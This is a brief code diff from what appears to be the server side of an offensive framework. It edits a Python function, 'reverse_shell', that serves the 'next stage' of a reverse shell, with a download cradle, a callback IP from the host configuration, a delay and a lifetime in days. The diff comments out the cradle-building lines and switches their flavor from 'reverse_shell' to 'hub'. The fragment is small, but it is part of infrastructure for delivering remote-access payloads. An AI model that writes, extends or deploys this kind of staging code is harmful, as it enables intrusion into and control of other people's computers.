@@ -509,10 +509,10 @@ def reload_modules():
 def reverse_shell():
     """Load next stage of the Reverse Shell"""
     context = {
-        "dl_cradle": build_cradle(
-            request.args,
-            flavor="reverse_shell",
-        ).replace('$K', '$R'),
+        #  "dl_cradle": build_cradle(
+        #      request.args,
+        #      flavor="hub",
+        #  ).replace('$K', '$R'),
         "IP": args.URI_HOST,
         "delay": 10,  # delay in seconds
         "lifetime": 3,  # lifetime in days
